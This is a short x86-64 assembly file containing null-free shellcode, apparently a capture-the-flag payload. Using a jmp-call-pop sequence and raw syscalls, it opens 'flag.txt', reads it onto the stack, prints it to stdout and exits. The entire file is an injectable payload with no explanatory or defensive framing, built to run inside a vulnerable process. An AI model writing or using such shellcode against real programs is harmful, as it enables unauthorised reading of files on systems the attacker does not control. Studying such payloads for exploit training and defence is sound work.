[section .text]
    global _start

_start:
    jmp short handle

printme:
    pop rdi
    xor rax, rax
	inc al
	inc al
    xor rsi, rsi
    syscall

    mov rdi, rax
    lea rsi, [rsp]
    xor rdx, rdx
    dec dx
    xor rax, rax
    syscall

    xor rdi, rdi
    inc dil
    mov rdx, rax
    xor rax, rax
    inc al
    syscall

    xor rax,rax
    mov al, 0x3c
    syscall
handle:
    call printme
    db "flag.txt"
